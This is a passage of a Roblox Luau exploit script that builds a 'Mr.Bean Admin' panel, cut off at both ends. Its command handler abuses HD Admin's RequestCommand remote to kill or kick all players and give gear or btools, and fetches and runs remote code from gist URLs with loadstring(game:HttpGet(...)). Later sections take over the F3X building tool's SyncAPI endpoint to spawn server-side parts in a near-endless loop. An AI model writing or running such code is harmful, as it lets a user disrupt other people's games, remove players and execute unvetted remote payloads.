		TextLabel_263877.Parent = ScrollingFrame_154627
		TextLabel_263877.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_263877.Position = UDim2.new(0, 0, 0, 9)
		TextLabel_263877.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_263877.Visible = true
		TextLabel_263877.Text = "THOMAS THE TRAIN [PLAYER] - makes you Thomas train [MOD]"
		TextLabel_263877.Font = Enum.Font.SourceSansSemibold
		TextLabel_263877.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_263877.TextSize = 16
		TextLabel_263877.TextScaled = true
		TextLabel_263877.BorderSizePixel = 0
		TextLabel_263877.BackgroundTransparency = 1
	
	
	
		local TextLabel_660843 = Instance.new("TextLabel")
		TextLabel_660843.Name = "TextLabel"
		TextLabel_660843.Parent = ScrollingFrame_154627
		TextLabel_660843.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_660843.Position = UDim2.new(0, 0, 0, 50)
		TextLabel_660843.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_660843.Visible = true
		TextLabel_660843.Text = "JohnDoe [PLAYER] - makes you John doe [MOD]"
		TextLabel_660843.Font = Enum.Font.SourceSansSemibold
		TextLabel_660843.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_660843.TextSize = 16
		TextLabel_660843.TextScaled = true
		TextLabel_660843.BorderSizePixel = 0
		TextLabel_660843.BackgroundTransparency = 1
	
	
		local TextLabel_270677 = Instance.new("TextLabel")
		TextLabel_270677.Name = "TextLabel"
		TextLabel_270677.Parent = ScrollingFrame_154627
		TextLabel_270677.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_270677.Position = UDim2.new(0, 0, 0, 70)
		TextLabel_270677.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_270677.Visible = true
		TextLabel_270677.Text = "Duck [PLAYER] - makes you duck/everyone duck [MOD]"
		TextLabel_270677.Font = Enum.Font.SourceSansSemibold
		TextLabel_270677.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_270677.TextSize = 16
		TextLabel_270677.BackgroundTransparency = 1
		TextLabel_270677.TextScaled = true
		TextLabel_270677.BorderSizePixel = 0
	
	
		local TextLabel_872176 = Instance.new("TextLabel")
		TextLabel_872176.Name = "TextLabel"
		TextLabel_872176.Parent = ScrollingFrame_154627
		TextLabel_872176.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_872176.Position = UDim2.new(0, 0, 0, 90)
		TextLabel_872176.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_872176.Visible = true
		TextLabel_872176.Text = "KFC [PLAYER] - changes map to kfc [MOD]"
		TextLabel_872176.Font = Enum.Font.SourceSansSemibold
		TextLabel_872176.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_872176.TextSize = 16
		TextLabel_872176.TextScaled = true
		TextLabel_872176.BackgroundTransparency = 1
		TextLabel_872176.BorderSizePixel = 0
	
	
	
	
	
		local TextLabel_717723 = Instance.new("TextLabel")
		TextLabel_717723.Name = "TextLabel"
		TextLabel_717723.Parent = ScrollingFrame_154627
		TextLabel_717723.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_717723.Position = UDim2.new(0, 0, 0, 110)
		TextLabel_717723.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_717723.TextScaled = true
		TextLabel_717723.Visible = true
		TextLabel_717723.Text = "GRAB KNIFE V4 [PLAYER] - gives u grab knife V4  [MOD]"
		TextLabel_717723.Font = Enum.Font.SourceSansSemibold
		TextLabel_717723.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_717723.TextSize = 16
		TextLabel_717723.BackgroundTransparency = 1
		TextLabel_717723.BorderSizePixel = 0
	
	
	
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 130)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "RAIN TACOS [PLAYER] - makes it rain tacos  [MOD]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 150)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "ServerMessage [TEXT] - makes a message for all players [SUPERADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 170)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "Gear [PLAYER] [ID] - gives player a specific gear [MOD]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 190)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "R6 [PLAYER] - Changes player character from r15 to r6 [MOD]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 210)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "F3X [PLAYER] - Gives player a F3X Btools. [SUPERADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 230)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "SWORD [PLAYER] - Gives player a Sword. [ADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 250)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "Countdown [NUMBER] - Makes countdown for everyone [ADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 270)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "Kill [PLAYER] - Kills selected player. [ADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 290)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "Kick [PLAYER] - Kicks selected player. [ADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 310)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "c00lgui [PLAYER] - gives you c00lgui [SUPERADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 330)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "refresh [PLAYER] - refreshes player [ADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 350)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "R15 [PLAYER] - changes character from r6 to r15 [ADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 370)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "PoliceCar [PLAYER] - spawns police car [ADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_357711 = Instance.new("TextLabel")
		TextLabel_357711.Name = "TextLabel"
		TextLabel_357711.Parent = ScrollingFrame_154627
		TextLabel_357711.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_357711.Position = UDim2.new(0, 0, 0, 390)
		TextLabel_357711.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_357711.Visible = true
		TextLabel_357711.Text = "music [ID] - plays the sound you typed [ADMIN]"
		TextLabel_357711.TextScaled = true
		TextLabel_357711.Font = Enum.Font.SourceSansSemibold
		TextLabel_357711.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_357711.TextSize = 16
		TextLabel_357711.BackgroundTransparency = 1
		TextLabel_357711.BorderSizePixel = 0
	
		local TextLabel_111421 = Instance.new("TextLabel")
		TextLabel_111421.Name = "TextLabel"
		TextLabel_111421.Parent = Frame_160579
		TextLabel_111421.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_111421.Position = UDim2.new(-0.03999999910593033, 20, 0, 0)
		TextLabel_111421.Size = UDim2.new(1, 0, 0.10000000149011612, 2)
		TextLabel_111421.Visible = true
		TextLabel_111421.Text = "Commands"
		TextLabel_111421.Font = Enum.Font.SourceSansSemibold
		TextLabel_111421.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_111421.TextSize = 15
		TextLabel_111421.TextScaled = true
		TextLabel_111421.BorderSizePixel = 0
		TextLabel_111421.BackgroundTransparency = 1
		local TextButton_950997 = Instance.new("TextButton")
		TextButton_950997.Name = "TextButton"
		TextButton_950997.Parent = Frame_160579
		TextButton_950997.BackgroundColor3 = Color3.new(0, 0, 0)
		TextButton_950997.Position = UDim2.new(0.800000011920929, 38, 0, -2)
		TextButton_950997.Size = UDim2.new(0.10000000149011612, 0, 0.10000000149011612, 5)
		TextButton_950997.Visible = true
		TextButton_950997.Text = "X"
		TextButton_950997.BorderSizePixel = 0
		TextButton_950997.BackgroundTransparency = 1
		TextButton_950997.Font = Enum.Font.SourceSansSemibold
		TextButton_950997.TextColor3 = Color3.new(1, 1, 1)
		TextButton_950997.TextSize = 30
		TextButton_950997.MouseButton1Click:Connect(function()
			Frame_160579.Visible = false
		end)
	
		local command = Instance.new("TextBox")
	
		local mr = Instance.new("ImageButton")
		mr.Size = UDim2.new(0.0, 75, 0.0, 75)
		mr.Position = UDim2.new(1, -91, 1, -91)
		mr.BackgroundColor3 = Color3.new(0, 0, 0)
		mr.ImageColor3 = Color3.new(1, 1, 1)
		mr.Image = "rbxassetid://123852508876370"
		mr.ImageTransparency = 0
		mr.Parent = gui
		mr.Name = "Wheel"
		mr.BackgroundTransparency = 1
		prefix = [[
	
	Welcome to Mr.Bean Admin Use the Program to execute scripts Status Enabled! type cmds in textbox to see commands.
	]]
		local debug = Instance.new("TextLabel")
		debug.Size = UDim2.new(6, 4, 1, 0)
		debug.Position = UDim2.new(-2.5, 0, -3.5, 0)
		debug.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
		debug.BackgroundTransparency = 1
		debug.Rotation = 450
		debug.Parent = mr
		debug.BorderSizePixel = 10
		debug.TextColor3 = Color3.fromRGB(255, 255, 0)
		debug.Text = prefix
		debug.TextScaled = true
		debug.TextTransparency = 1
		debug.TextSize = 20
		---2.5, 0, 0, -280
	
		mr.MouseButton1Click:Connect(function() 
			if mr.Image == "rbxassetid://123852508876370" then
				local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
				local tween = TweenService:Create(mr, tweenInfo, {Rotation = -90})
				tween:Play()
				mr.Image = "rbxassetid://1222570808"
	
				local tween = TweenService:Create(debug, tweenInfo, {BackgroundTransparency = 0.25})
				tween:Play()
	
				local tween = TweenService:Create(debug, tweenInfo, {TextTransparency = 0})
				tween:Play()
	
			elseif mr.Image == "rbxassetid://1222570808" then
				local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
				local tween = TweenService:Create(mr, tweenInfo, {Rotation = 0})
				tween:Play()
	
				mr.Image = "rbxassetid://123852508876370"
				local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
				local tween = TweenService:Create(debug, tweenInfo, {BackgroundTransparency = 1})
				tween:Play()
	
				local tween = TweenService:Create(debug, tweenInfo, {TextTransparency = 1})
				tween:Play()
			end
		end)
	
	
	
	
		command.Size = UDim2.new(0.9, 99, 0.0, 16)
		command.Position = UDim2.new(0.0, 0, 0.0, -46)
		command.BackgroundColor3 = Color3.new(0, 0, 0)
		command.BorderColor3 = Color3.new(0, 0, 0)
		command.BorderSizePixel = 0
		command.Text = ""
		command.TextColor3 = Color3.new(1, 1, 1)
		command.BackgroundTransparency = 0.4
		command.Font = Enum.Font.Code 
		command.TextSize = 15
		command.Parent = gui
		command.ClearTextOnFocus = true
	
	
		command.FocusLost:Connect(function(enterPressed)
			if enterPressed then
				local cmdText = command.Text
				local player = game.Players.LocalPlayer
				local character = player.Character
	
				if cmdText == ":kill all" then
					RequestCommand:InvokeServer(";kill all")
	
				elseif cmdText == ":kick me" then
					player:Kick("Mr bean admin has kicked you...")
	
				elseif cmdText == ":JohnDoe me" then
					loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/7dc946ff059597ebc1771700f4d8def0/raw/eb3e57fb2da19dbce3720a90fc3bfe8946dd1002/John%2520Doe"))()
	
				elseif cmdText == ":THOMAS THE TRAIN me" then
					loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/a2681fd903736f2a875b08f6e7649e4c/raw/ca80888f51a5b794a6d229f2e1e7f13d9cc07280/thomasV2"))()
	
				elseif cmdText == ":THOMAS THE TRAIN all" then
					loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/562cde11969b4431de8583ddc5ab1677/raw/c2fe2b299d45d5a77cedb7c3d2f0a3c57eee4e3d/thomas%2520all"))()
	
				elseif cmdText == ":kick all" then
					RequestCommand:InvokeServer(";kick all Mr bean admin kicked you.")
	
				elseif cmdText == ":kill me" then
					character.Humanoid.Health = 0
	
				elseif cmdText == ":PoliceCar" then
					RequestCommand:InvokeServer(";Insert 6418230807")
	
				elseif cmdText == ":duck me" then
					loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/1a9645468431e7ef12a3a0f239771a3b/raw/ac9ce7c2d696e4f385c255b3485374ea8f69db0e/Duck"))()
	
				elseif cmdText == ":duck all" then
					loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/3c283ac5f1ff249eb28a575dd7658f71/raw/08ee4f4f77d38a27d5aa86cc4fca3e8c90ec3936/duck%2520all"))()
	
				elseif cmdText == ":RAIN TACOS" or cmdText == "rain tacos" then 
					loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/6cbfd32d1cd33a6fde00369eb29715c2/raw/b5f3833bd01fd3b1a60fbded584e05edb28245d0/taco"))()
	
				elseif cmdText == ":cmds" then
					Frame_160579.Visible = true
	
				elseif cmdText == ":c00lgui" then
					loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/925a6f7ef500b254e7d47b529aec10e2/raw/8dbe42995c53877fc2ea08145d659c0c09ccbd32/c00lkigui"))()
	
				elseif cmdText == ":sword" or cmdText == ":sword me" then
					e(";sword me")
	
				elseif cmdText == ":sword all" then
					e(";sword all")
	
				elseif cmdText == ":AK47" or cmdText == ":ak47" or cmdText == ":AK47 me" or cmdText == ":ak47 me" then
					RequestCommand:InvokeServer(";gear me 116693764")
	
				elseif cmdText == ":f3x" or cmdText == ":btools" then
					RequestCommand:InvokeServer(";btools")
	
				elseif cmdText == ":r6" or cmdText == ":r6 me" or cmdText == ":R6 me" or cmdText == ":R6" then
					RequestCommand:InvokeServer(";R6 me")
	
				elseif cmdText == ":refresh" or cmdText == ":refresh me" then
					e(";refresh me")
	
				elseif cmdText == ":r15" or cmdText == ":r15 me" then
					e(";r15 me")
	
				elseif cmdText:lower():sub(1,7) == ":gear " then
					local parts = cmdText:split(" ")
					if #parts >= 3 then
						local target = parts[2]
						local gearId = parts[3]
						if target and gearId then
							RequestCommand:InvokeServer(";gear "..target.." "..gearId)
						end
					end
	
				elseif cmdText:lower():sub(1,8) == ":music " then
					local parts = cmdText:split(" ")
					if #parts >= 2 then
						local id = parts[2]
						RequestCommand:InvokeServer(";music "..id)
					end
	
				elseif cmdText:lower():sub(1,5) == ":sm " then
					local parts = cmdText:split(" ")
					if #parts >= 2 then
						local msg = table.concat(parts, " ", 2)
						RequestCommand:InvokeServer(";sm "..msg)
					end
				end
	
				command.Text = ""
			end
		end)
	
	
	end)
end;
task.spawn(C_4d);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_4f()
local script = G2L["4f"];
	script.Parent.MouseButton1Click:Connect(function()
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
	
		-- Raining tacos, credits to original author: ItsKittyyyGD
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		function Sky(id)
			local hrp = char:WaitForChild("HumanoidRootPart")
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
					SetAnchor(true, v)
					AddMesh(v)
					SetMesh(v, "111891702759441")
					SetTexture(v, id)
					MeshResize(v, Vector3.new(8000, 8000, 8000))
				end
			end
		end
	
		local function createRainToads()
			while true do
				wait(0.001)
				if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
					local hrpcf = player.Character.HumanoidRootPart.CFrame
					local x = hrpcf.x
					local z = hrpcf.z
					local randint = math.random(-600, 600)
					local randint2 = math.random(-600, 600)
					local xloc = randint + x
					local zloc = randint2 + z
					local cf = player.Character.HumanoidRootPart.CFrame.y + 800  
	
					spawn(function()
						local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)), workspace)
						for i, v in game.Workspace:GetDescendants() do
							if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
								spawn(function()
									SetName(v, "Taco")
								end)
								spawn(function()
									SetAnchor(false, v)
								end)
								spawn(function()
									AddMesh(v)
								end)
								spawn(function()
									MeshResize(v, Vector3.new(20, 20, 20))
								end)
								spawn(function()
									SetMesh(v, "14846869")
								end)
								spawn(function()
									SetTexture(v, "14846834")
								end)
								spawn(function()
									SetCollision(v, false)
								end)
								spawn(function()
									MovePart(v, v.CFrame * CFrame.new(
										math.random(-5, 5), 
										math.random(0, 10), 
										math.random(-5, 5) 
										) * CFrame.Angles(
											math.rad(math.random(10, 180)),
											math.rad(math.random(10, 180)),
											math.rad(math.random(10, 180))
										))
	
								end)
	
	
	
							end
						end
					end)
				else
					wait(1)
				end
			end
		end
	
		coroutine.wrap(createRainToads)()
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
	end)
end;
task.spawn(C_4f);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_51()
local script = G2L["51"];
	script.Parent.MouseButton1Click:Connect(function()
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
	
		-- Raining tacos, credits to original author: ItsKittyyyGD
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
